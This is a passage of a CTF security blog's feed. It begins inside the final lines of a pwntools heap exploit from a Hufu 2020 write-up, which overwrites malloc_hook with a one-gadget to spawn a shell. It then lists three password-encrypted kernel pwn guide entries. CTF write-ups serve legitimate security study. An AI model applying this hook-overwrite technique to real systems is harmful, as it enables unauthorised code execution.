class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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